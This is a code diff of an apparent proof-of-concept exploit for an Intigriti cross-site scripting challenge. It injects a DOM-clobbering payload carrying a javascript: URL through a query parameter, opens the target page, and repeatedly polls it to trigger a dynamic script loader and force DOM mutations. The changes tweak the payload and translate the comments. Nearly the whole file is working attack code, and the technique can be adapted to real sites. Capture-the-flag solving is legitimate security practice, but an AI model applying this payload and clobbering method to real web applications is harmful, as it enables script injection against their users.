@@ -2,7 +2,7 @@
 <html>
 <body>
 <script>
-    const payload = `</strong><div id=strong></div><div id=CONFIG_SRC data-url=javascript:alert(document.domain)>test</div><marquee>Trigger Mutation</marquee><details open><summary>Click Me</summary>x`;
+    const payload = `</strong><div id=strong></div><div id=CONFIG_SRC data-url=javascript:alert(document.domain)>test</div><details open><summary>Click Me</summary></details>`;
 
     const targetUrl = `https://challenge-0525.intigriti.io/begin?name=${encodeURIComponent(payload)}`;
     const backUrl = "https://pedrojuniorrd.github.io/_layouts/back.html?n=1";
@@ -17,14 +17,14 @@
 
     const proactive = setInterval(() => {
         try {
-            // Tentativa direta
             if (w.document && w.CONFIG_SRC && typeof w.addDynamicScript === "function") {
+                console.log("✅ Calling addDynamicScript...");
                 w.addDynamicScript();
                 clearInterval(proactive);
             } else if (w.document?.getElementById('message')) {
-                // Forçar mutação nativa
+                // Trigger real DOM Mutation
                 const newNode = w.document.createElement('div');
-                newNode.innerText = "Forced Mutation";
+                newNode.innerText = "Forced Mutation Trigger";
                 w.document.getElementById('message').appendChild(newNode);
             }
         } catch (e) {}
